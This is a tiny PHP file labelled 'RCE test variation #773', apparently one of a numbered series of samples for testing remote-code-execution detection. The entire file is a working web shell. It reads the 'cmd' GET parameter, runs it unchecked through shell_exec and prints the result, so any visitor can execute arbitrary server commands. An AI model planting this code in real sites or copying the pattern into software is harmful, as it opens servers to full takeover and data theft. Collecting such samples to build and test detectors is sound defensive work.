<?php
// RCE test variation #773
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>